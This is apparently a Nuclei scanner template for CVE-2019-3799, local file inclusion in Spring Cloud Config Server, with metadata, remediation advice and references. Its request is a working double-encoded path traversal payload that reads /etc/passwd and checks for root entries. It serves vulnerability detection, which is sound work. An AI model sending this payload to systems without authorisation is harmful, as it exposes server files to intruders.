id: CVE-2019-3799

info:
  name: Spring Cloud Config Server - Local File Inclusion
  author: madrobot
  severity: medium
  description: Spring Cloud Config Server versions 2.1.x prior to 2.1.2, 2.0.x prior to 2.0.4, 1.4.x prior to 1.4.6, and older unsupported versions are vulnerable to local file inclusion because they allow applications to serve arbitrary configuration files. An attacker can send a request using a specially crafted URL that can lead to a directory traversal attack.
  impact: |
    An attacker can exploit this vulnerability to read arbitrary files on the server, potentially leading to unauthorized access or sensitive information disclosure.
  remediation: |
    Upgrade to a patched version of Spring Cloud Config Server or apply the recommended security patches.
  reference:
    - https://github.com/mpgn/CVE-2019-3799
    - https://pivotal.io/security/cve-2019-3799
    - https://www.oracle.com/security-alerts/cpuapr2022.html
    - https://nvd.nist.gov/vuln/detail/CVE-2019-3799
    - https://github.com/0xT11/CVE-POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cve-id: CVE-2019-3799
    cwe-id: CWE-22
    epss-score: 0.91318
    epss-percentile: 0.9963
    cpe: cpe:2.3:a:vmware:spring_cloud_config:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: vmware
    product: spring_cloud_config
  tags: cve,cve2019,lfi,vmware,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'root:.*:0:0:'

      - type: status
        status:
          - 200
# digest: 490a004630440220113fc639e60dc389c90f27b4840819878dd558bad620c1feb11057206207fb9002201e8e3cf677eb7d539a1af697385be504ecbdea4051aebe980c8c7903cd59efb0:922c64590222798bb761d5b6d8e72950